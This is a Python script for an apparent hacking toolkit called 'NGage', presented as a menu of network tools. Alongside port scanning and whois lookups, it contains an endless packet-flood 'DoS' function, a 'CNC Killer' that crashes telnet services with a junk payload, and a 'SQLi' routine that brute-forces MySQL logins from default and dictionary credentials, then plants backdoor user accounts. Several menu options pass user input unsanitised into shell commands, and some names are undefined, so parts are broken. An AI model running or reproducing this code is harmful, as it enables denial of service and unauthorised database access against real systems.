# -*- coding: utf-8 -*-
import socket, sys, os, time, whois, termcolor, subprocess, __classes__, pymysql, telnetlib, requests, string, sys, datetime as dt, ctypes as ct
from termcolor import cprint, colored
from socket import AF_INET, SOCK_DGRAM, SO_KEEPALIVE, SOL_SOCKET

def device_ip():
  ip_addr = subprocess.run(["ip route | awk '{print $9}'"], stdout=subprocess.PIPE, shell=True).stdout.decode('utf-8')
  return colored(ip_addr, colors.green, attrs = attributes.bold)
  
def inet_check():
  Passed = """>>> Internet Connection Found. Your IP is:
%s""" % device_ip()
  Failed = ">>> No Internet Connection Found. Exiting NGage"
  try:
    sock = socket.create_connection(("www.google.com", 80))
    if sock is not None:
      sock.close
      cprint(colored(Passed, colors.yellow, attrs = attributes.bold))
      time.sleep(2)
      os.system('clear')
  except OSError:
    cprint(colored(Failed, colors.red,  attrs = attributes.bold))
    time.sleep(3)
    os.system('python main.py')
    
def inet_gateway():
  gateway_addr = subprocess.run(["ip route show | awk '{print $1}'"], stdout=subprocess.PIPE, shell=True).stdout.decode('utf-8')
  return colored(gateway_addr, colors.green, attrs = attributes.bold)

if os.name == "nt":
  print("I AM NOT COMPATIBLE WITH WINDOWS SYSTEMS! PLEASE ENABLE THE WINDOWS LINUX SUBSYSTEM FROM THE OPTIONAL FEATURES, THEN DOWNLOAD A FREE LINUX TERMINAL FROM THE MICROSOFT STORE TO USE ME!")
  sys.exit()
  
banner = """
 ##############################################
 ##############################################
 ###                                        ###
 ###  #     #  #####                        ###
 ###  ##    # #     #   ##    ####  ######  ###
 ###  # #   # #        #  #  #    # #       ###
 ###  #  #  # #  #### #    # #      #####   ###
 ###  #   # # #     # ###### #  ### #       ###
 ###  #    ## #     # #    # #    # #       ###
 ###  #     #  #####  #    #  ####  ######  ###
 ###                                        ###
 ##############################################
 ##############################################
 """
s = socket.socket(AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
colors = __classes__.colors
highlights = __classes__.highlights
attributes = __classes__.attributes

os.system('clear')
  
def port_scan():
  file = open('.logs/port-scan-logs.txt', 'w+')
  target_ip = input(colored(">>> Target IP Address: ", colors.magenta))
  cprint(colored(">>> Scanning %s. Please Wait..." % target_ip, colors.green))
  try:
    for port in range(1, 65535):
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(1)
      result = s.connect_ex((target_ip, port))
      if result == 0:
        cprint(colored(">>> Open: %s" % port, colors.blue))
        file.write("%s" % port)
      s.close()
  except KeyboardInterrupt:
    cprint(colored(">>> Exiting", colors.red))
    sys.exit()
  except socket.gaierror:
    cprint(colored('>>> %s could not be resolved. Exiting' % ip, colors.red))
    sys.exit()
  except socket.error:
    cprint(colored(">>> Couldn't connect to %s" % ip, colors.red))
    sys.exit()
    
def dos():
  target_ip = input(colored(">>> Target IP Address: ", colors.magenta))
  port = input(colored(">>> Target Port: ", colors.magenta))
  target = (target_ip, int(port))
  data = bytearray(1490)
  check = s.connect_ex(target)
  sent = 0
  while True:
    sent += 1
    if check == 0:
      s.sendto(data, target)
      s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
      cprint(colored('[%s] I sent the data to %s:%s' % (sent, target_ip, port), colors.blue))

def device_map():
  cprint(colored("Your gateway address is: %s" % inet_gateway(), colors.red, attrs = attributes.bold))
  gateway = input(colored(">>> Target Gateway Address: ", colors.magenta))
  devices = os.popen("nmap " + gateway + " -n -R -sP ").read()
  cprint(colored(">>> DEVICES CONNECTED TO YOUR NETWORK:", colors.green))
  cprint(colored("""============================================              
%s
============================================""" % devices, colors.green))

def cnckill(ip,port):
    payload = 'getrekt' * 10000
    try:
        kill = telnetlib.Telnet(ip,port)
    except:
        print(f"CNC-KILL => FAILED : UNABLE TO CONNECT")
        return
    try:
        kill.write(payload.encode('ascii') + b"\n")
        kill.close()
    except:
        pass
    try:
        sleep(3)
        _ = telnetlib.Telnet(ip,port)
    except:
        print(f" CNC-KILL => SUCCESS")
        return
    print(f"CNC-KILL => FAILED")

def SQLi(ip):
    try:
        print(f"[>] SQLi => ATTEMPTING")
        print(f"[>] CONNECTING TO => {ip}")
        conn = pymysql.connect(host=ip,user='root',password='root',charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
        cursor = conn.cursor()
        print(f"[<] CONNECTION MADE => {ip}")
        cursor.execute('show databases')
        for a_dict in cursor.fetchall():
            for db in a_dict:
                try:
                    cursor.execute(f'use {a_dict[db]};')
                    print(f"[<] INJECTING => {ip}")
                    cursor.execute(f"INSERT INTO users VALUES (NULL, 'j0k3r', 'ownsyou', 0, 0, 0, 0, -1, 1, 30, '');")
                    print(f"[<] INJECTION SUCCESS! => {ip}")
                    print(f"[>] DETAILS => 'j0k3r' | 'ownsyou'")
                    return
                except:
                    pass
    except Exception as e:
        if 'ACCESS DENIED' in str(e):
            for combo in creds.splitlines():
                if combo == '':
                    continue
                uname = combo[:combo.index(':')]
                try:
                    password = combo[combo.index(':')+1:]
                except ValueError:
                    password = ''
                try:
                    print(f"[>] SQLi => ATTEMPTING")
                    print(f"[>] CONNECTING TO => {ip} | DICTIONARY BRUTEFORCE")
                    conn = pymysql.connect(host=ip,user=uname,password=password,charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
                    print(f"[>] CONNECTION MADE => {ip}")
                    cursor = conn.cursor()
                    cursor.execute('show databases')
                    for a_dict in cursor.fetchall():
                        for db in a_dict:
                            try:
                                    cursor.execute(f'use {a_dict[db]};')
                                    print(f"  ┣━[<] INJECTING => {ip}")
                                    cursor.execute("INSERT INTO users VALUES (NULL, 'vital', 'ownsyou', 0, 0, 0, 0, -1, 1, 30, '');")
                                    print(f"  ┣━[<] INJECTION SUCCESS! => {ip}")
                                    print(f"  ┣━[>] DETAILS => 'vital' | 'ownsyou'")
                                    return
                            except:
                                pass
                except:
                    pass
        else:
            pass
    print(f"SQLi => FAILED")

def whois_lookup():
  url = input(colored(">>> Target Website: ", colors.magenta))
  WhoisResults = whois.query(url)
  remoteServerIP = socket.gethostbyname(url)
  cprint(colored(f"""Name: %s
IP Address: %s
Creation Date: %s 
Expiration Date: %s
Servers: %s
Registrar: %s
Status: %s""" % (WhoisResults.name,
remoteServerIP,
WhoisResults.creation_date,
WhoisResults.expiration_date,
WhoisResults.name_servers,
WhoisResults.registrar,
WhoisResults.status), colors.yellow))

inet_check()
cprint(colored(banner, colors.cyan, attrs = attributes.bold))
cprint(colored("""Welcome to the Network Tools Menu:
01: NGage Port Scanner 
02: NGage DoS (local network device ports)
03: Network Device Mapper (via Nmap)
04: NGage Website Whois Lookup
05: NGage Admin Panel Finder
06: Local IP Lookup (via IP-Tracer)
07: Vuln Scanner (via Nikto)
08: CNC Killer
09: SQLi
10: Back To The Main Menu
""", colors.yellow, attrs = attributes.bold))
selection = input(colored(">>> Please select an option: ", colors.magenta, attrs = attributes.bold))
if selection == '1':
  os.system('clear')
  port_scan()
elif selection == '2':
  os.system('clear')
  try:
    dos()
  except ConnectionResetError:
    cprint(colored(">>> NGage DoS: Server Down", colors.green))
    time.sleep(2)
    os.system('python main.py')
  except BrokenPipeError:
    cprint(colored(">>> NGage DoS: Broken Pipe Detected", colors.green))
    time.sleep(2)
    os.system('python main.py')
  except:
    cprint(colored(">>> NGage DoS: Failed To Load", colors.red))
    time.sleep(2)
elif selection == '3':
  os.system('clear')
  try:
   time.sleep(2)
   device_map()
  except:
   cprint(colored(">>> Network Device Mapper: Failed To Load Nmap", colors.red))
elif selection == '4':
  os.system('clear')
  try:
    whois_lookup()
  except:
    cprint(colored(">>> NGage Whois Lookup: Please make sure the website is valid", colors.red, attrs = attributes.bold))
    time.sleep(2)
    os.system('python main.py')
elif selection == '5':
  os.system('clear')
  os.system('python modules/admin-panel-finder.py')
elif selection == '6':
  os.system('clear')
  ipaddr = input(colored(">>> Target IP (local ips only): ", colors.magenta))
  os.system('trace -t ' + ipaddr)
  time.sleep(5)
  os.system('python main.py')
elif selection == '7':
  os.system('clear')
  webaddr = input(colored(">>> Target Website: ", colors.magenta))
  os.system('perl modules/nikto/program/nikto.pl -host ' + webaddr + ' -port 80 -Display 1 2 3 4 -C all')
elif selection == '8':
  os.system('clear')
  try:
    time.sleep(2)
    cnckill(ip,port)
  except:
    cprint(colored("Failed", colors.magenta))
elif selection == '9':
  os.system('clear')
  time.sleep(2)
  SQLi(ip)
elif selection == '10':
  os.system('python main.py')
else:
  cprint(colored(">>> Please choose a valid option!", colors.red,  highlights.yellow))
  os.system('python main.py')